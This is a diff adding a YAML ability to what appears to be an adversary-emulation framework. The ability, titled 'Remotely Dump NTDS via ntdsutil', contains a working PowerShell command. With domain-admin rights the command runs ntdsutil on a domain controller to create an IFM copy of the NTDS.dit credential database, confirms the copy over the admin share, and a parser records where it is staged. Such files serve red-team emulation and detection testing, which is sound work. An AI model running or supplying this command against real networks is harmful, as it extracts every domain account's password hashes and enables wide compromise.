@@ -1,0 +1,36 @@
+- id: 1a2b3c4d-e5f6-7a8b-9c0d-ntds-dump
+  name: Collection - Remotely Dump NTDS via ntdsutil
+  description: Uses DA privileges to remotely execute ntdsutil on the DC, creating an IFM backup in a temporary staging folder.
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: "OS Credential Dumping: NTDS"
+  requirements:
+    # Requires confirmed DA privileges and the DC's hostname
+    - plugins.stockpile.app.requirements.existential:
+        - source: domain.user.impersonated
+        - source: domain.controller.hostname
+  platforms:
+    windows:
+      psh:
+        command: |
+          $dc = "#{domain.controller.hostname}";
+          $remoteStagingDir = "C:\IFM";
+          Invoke-Command -ComputerName $dc -ScriptBlock {
+              param($path);
+              New-Item -Path $path -ItemType Directory -Force;
+              ntdsutil.exe "ac i ntds" "ifm" "create full $path" q q;
+          } -ArgumentList $remoteStagingDir;
+
+          $remoteNtdsFile = "\\$dc\c$\IFM\Active Directory\ntds.dit";
+          if (Test-Path $remoteNtdsFile) {
+            Write-Host "NTDS-Staged-At: $remoteStagingDir";
+          } else {
+            Write-Error "[FAILURE] NTDS.dit was not found in the remote staging directory.";
+          }
+        parsers:
+          plugins.adversary_emulation.app.parsers.regex_parser:
+            - source: 'file.ntds.staged_path_remote'
+              custom_parser_vals:
+                regex: 'NTDS-Staged-At:\s+(.*)'
+                edge_label: 'is_staged_on_dc'
